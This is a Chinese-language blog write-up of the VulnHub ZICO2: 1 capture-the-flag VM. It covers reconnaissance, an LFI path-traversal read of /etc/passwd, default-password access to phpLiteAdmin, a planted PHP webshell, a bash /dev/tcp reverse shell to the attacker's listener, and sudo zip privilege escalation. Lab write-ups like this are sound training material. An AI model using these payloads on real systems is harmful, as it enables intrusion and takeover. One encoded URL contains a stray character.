---
layout: post
title: "滲透測試練習 - ZICO2: 1"
description: 第二台練習的靶機，廢話很多
date: 2023-07-14 00:00:00 +0800
category: Writeup 靶機
tags: VulnHub 靶機 滲透測試
---

## 靶機下載
- **Vulnhub 平台上的 ZICO2: 1 虛擬機**
    - 原始頁面: [請進(〃∀〃)](https://www.vulnhub.com/entry/zico2-1,210/)
    - 原始載點: [點我下載(〃∀〃)](https://download.vulnhub.com/zico/zico2.ova)
    - 備用載點: [也可以點我下載(〃∀〃)](https://drive.google.com/file/d/1-6z5HMaF2lDMXjQOCYEqSOCcUqG1eFEi/view?usp=sharing)

## 設置靶機

- **載入虛擬機**
     下載後回得到一個名為 **zico2.ova** 的檔案，直接開啟即可。
     輸入 **名稱** 後按下 **Import**（名稱部分可任意取）
    ![image](https://hackmd.io/_uploads/ByphnvoHC.png)

    
    </br>如出現以下訊息，選擇 **Retry** 即可
    ![image](https://hackmd.io/_uploads/HkX33wjr0.png)


- **處理錯誤**
    我自己使用這台靶機的時候有遇到一些問題，就是開啟 ZICO2 虛擬機設定頁面時會崩潰。
    
    - **先嘗試進入 ZICO2 虛擬機設定頁面**
        ![image](https://hackmd.io/_uploads/rJeshPsSR.png)


    - **如果沒跳出以下訊息，可以跳過下一個 (更改虛擬機設定檔內容) 的步驟**
        ![image](https://hackmd.io/_uploads/rkHqnDsrR.png)

    - **更改虛擬機設定檔內容**
        對你的 ZICO2 虛擬機 按右鍵，選擇 **Open VM directory**
        ![image](https://hackmd.io/_uploads/SkOu2vsB0.png)


        </br>使用文字編輯軟體打開 **結尾為 .vmx** 的檔案
        ![image](https://hackmd.io/_uploads/BJkdhDiHC.png)

        </br>找到 **virtualhw.version** 這一行，將值改為 19 
        ![image](https://hackmd.io/_uploads/Bkrv2viS0.png)

        </br>這時應該就可以正常開啟設定頁面。

- **設定網路**
    根據你的環境，設定網路，確保你的攻擊機和靶機是可以互通的。


- **虛擬機開機**
    就是開機。
    
## 確認網路

- **找靶機 IP**
    ```bash
    sudo arp-scan -l
    ```

    ![image](https://hackmd.io/_uploads/ryh83voSR.png)


- **確認連通性**
    ```bash
    ping -c 4 192.168.75.137
    ```
    
    ![image](https://hackmd.io/_uploads/HJr8nvjr0.png)

## 開始入侵

### 1. 掃 port
```bash
nmap -A 192.168.75.137
```

![image](https://hackmd.io/_uploads/HJAH3DiHA.png)

>可以看到 22 80 111 是開啟的

### 2. 先對網站下手
- **目錄爆破**
    ```bash
    dirb http://192.168.75.137 -r
    ```
    
    結果：
    ```bash
    + http://192.168.75.137/cgi-bin/ (CODE:403|SIZE:290)
    ==> DIRECTORY: http://192.168.75.137/css/
    ==> DIRECTORY: http://192.168.75.137/dbadmin/
    ==> DIRECTORY: http://192.168.75.137/img/
    + http://192.168.75.137/index (CODE:200|SIZE:7970)
    + http://192.168.75.137/index.html (CODE:200|SIZE:7970)
    ==> DIRECTORY: http://192.168.75.137/js/
    + http://192.168.75.137/LICENSE (CODE:200|SIZE:1094)
    + http://192.168.75.137/package (CODE:200|SIZE:789)
    + http://192.168.75.137/server-status (CODE:403|SIZE:295)
    + http://192.168.75.137/tools (CODE:200|SIZE:8355)
    ==> DIRECTORY: http://192.168.75.137/vendor/
    + http://192.168.75.137/view (CODE:200|SIZE:0)
    ```
    >有 admin 字樣，可以去看看內容
    >http://192.168.75.137/dbadmin/
    >
    >網頁預設頁面
    >http://192.168.75.137/index

- **網頁預設頁面**
    - **LFI 漏洞**
        在裡面逛逛後發現網址
        http://192.168.75.137/view.php?page=tools.html
        存在 **page=** ，可以試試看 LFI 漏洞
        
        - 使用 cURL 來做
            先試試原本的頁面，這時會輸出網頁原始碼
            ```bash
            curl http://192.168.75.137/view.php?page=tools.html
            ```
            
            </br>隨便試試一個路徑，會發現沒輸出，表示可能沒這個檔案
            ```bash
            curl http://192.168.75.137/view.php?page=ovob.html
            ```
            
            </br>去嘗試etc/passwd
            ```bash
            curl http://192.168.75.137/view.php?page=etc/passwd
            ```
            
            </br>一層一層往下試
            ```bash
            curl http://192.168.75.137/view.php?page=../../etc/passwd
            ```
            >使用
            >curl http://192.168.75.137/view.php?page=../../../etc/passwd
            >也可以成功印出，因為 **../../** 已經到根目錄了
            >**../../../** 表示再往下一層，但無法再往下了，這時一樣是在根目錄
            
            </br>最後得到 passwd 內容
            ```bash
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/bin/sh
            bin:x:2:2:bin:/bin:/bin/sh
            sys:x:3:3:sys:/dev:/bin/sh
            sync:x:4:65534:sync:/bin:/bin/sync
            games:x:5:60:games:/usr/games:/bin/sh
            man:x:6:12:man:/var/cache/man:/bin/sh
            lp:x:7:7:lp:/var/spool/lpd:/bin/sh
            mail:x:8:8:mail:/var/mail:/bin/sh
            news:x:9:9:news:/var/spool/news:/bin/sh
            uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
            proxy:x:13:13:proxy:/bin:/bin/sh
            www-data:x:33:33:www-data:/var/www:/bin/sh
            backup:x:34:34:backup:/var/backups:/bin/sh
            list:x:38:38:Mailing List Manager:/var/list:/bin/sh
            irc:x:39:39:ircd:/var/run/ircd:/bin/sh
            gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
            nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
            libuuid:x:100:101::/var/lib/libuuid:/bin/sh
            syslog:x:101:103::/home/syslog:/bin/false
            messagebus:x:102:105::/var/run/dbus:/bin/false
            ntp:x:103:108::/home/ntp:/bin/false
            sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
            vboxadd:x:999:1::/var/run/vboxadd:/bin/false
            statd:x:105:65534::/var/lib/nfs:/bin/false
            mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
            zico:x:1000:1000:,,,:/home/zico:/bin/bash
            ```
            >這時發現一個名為 zico 的用戶，先記起來。
            
- **dbadmin**
    進入頁面後可以看到 **phpLiteAdmin v1.9.3**
    ![image](https://hackmd.io/_uploads/Hy1H2worA.png)

    
    - **嘗試使用預設密碼**
        根據 phpLiteAdmin 對應的版本去查預設密碼是 admin
        成功進入
    
    <!-- - **也玩看看密碼字典攻擊** -->
        
    <!-- - **測試 PUT 協議** -->

    - **使用漏洞植入 php 腳本**
        根據 phpLiteAdmin 對應的版本去查詢後發現有 RCE 漏洞
        https://www.exploit-db.com/exploits/24044
        
        在 Kali Linux 內可以直接使用
        **cat /usr/share/exploitdb/exploits/php/webapps/24044.txt** 
        來印出相關內容
        ![image](https://hackmd.io/_uploads/rJwV3vjrC.png)


        
        >內容提到要達成效果主要有兩個步驟
        >直接來測試看看

        
        - **1. 建立 database**
            透過建立副檔名為 .php 的 database 來創造一個 .php 檔案
            
            建立 database
            ![image](https://hackmd.io/_uploads/BkT72vsrR.png)

            
            </br>可以看到 .php database 建立成功
            ![image](https://hackmd.io/_uploads/SkDm2PjrC.png)


        - **2. 插入 php 腳本**
            透過在 database 中建立 table 的方式來插入 php 腳本
            
            建立一個 table
            ![image](https://hackmd.io/_uploads/rk0f2DsrC.png)

            </br>先用 **<?php phpinfo()?>** 測試看看
            ![image](https://hackmd.io/_uploads/r1Pf2vsB0.png)

            
            </br>建立成功
            ![image](https://hackmd.io/_uploads/S1AW3wiSA.png)

            
            </br>使用 LFI 漏洞去執行這個 .php　檔案
            在瀏覽器輸入**http://192.168.75.137/view.php?page=../../../usr/databases/ovob.php**
            成功執行到 php 腳本
            ![image](https://hackmd.io/_uploads/HJOWhDsrA.png)



        測試成功後，現在正式插入我們想要執行的腳本
        - **1. 再建立一個 database**
            ![image](https://hackmd.io/_uploads/B1CghvirR.png)

        - **2. 插入 php 腳本**
            建立 table
            ![image](https://hackmd.io/_uploads/rJEl2wir0.png)


            </br>插入 webshell php 腳本 
            **<?php echo shell_exec($_GET["cmd"]); exit; ?>**

            ![image](https://hackmd.io/_uploads/SkvRiwjBC.png)

            ![image](https://hackmd.io/_uploads/SJeRjDjS0.png)




            </br>在 kali linux 執行
            **nc -lvvp 80**
            ![image](https://hackmd.io/_uploads/rkw6oDiHA.png)

            >在測試的時候都把 -lvvp 打成 -lvp
            >卡了整個晚上都連不到...
            
            </br>最後把我們要執行的命令: 
            **bash -c 'bash -i >& /dev/tcp/192.168.75.136/80 0>&1'**
            轉成 Url 編碼: 
            **bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.75.136%2F80%200%3E%261%27**
            
            在瀏覽器輸入
            ```
            http://192.168.75.137/view.php?page=../../../usr/databases/ovob2.php&cmd=bash%20-c%20%27bash%20ㄦi%20%3E%26%20%2Fdev%2Ftcp%2F192.168.75.136%2F80%200%3E%261%27
            ```
            
            就可以獲得 shell
            ![image](https://hackmd.io/_uploads/BkR3swoSA.png)

            
            
### 3. 翻資料

作者提示，靶機內的用戶嘗試使用不同的工具來架設網站
這時先找到其他使用者的目錄，並且在其中發現 wordpress 資料夾
![image](https://hackmd.io/_uploads/ByQnoDirC.png)

</br>發現有設定檔
![image](https://hackmd.io/_uploads/ByaiswjBC.png)

</br>cat wp-config.php
發現有使用者設定的密碼
![image](https://hackmd.io/_uploads/rkPiiPoH0.png)

### 4. 登入其他使用者

把密碼拿去嘗試登入 zico　使用者，成功進入。
![image](https://hackmd.io/_uploads/BkCcsDiSR.png)

看看能使用 root 權限做哪些事，只有 tar 和 zip
![image](https://hackmd.io/_uploads/Sk0KsvjrA.png)

### 5. 提權
使用 zip 提權
![image](https://hackmd.io/_uploads/rkIKjDoHR.png)

取得 flag
![image](https://hackmd.io/_uploads/S1ztoDoSR.png)



## 筆記：其他可以嘗試的解法
提權漏洞：dirtycow
提權方法：tar

## 其他
netcat traditional openbsd
url &會被解析掉，要使用url encode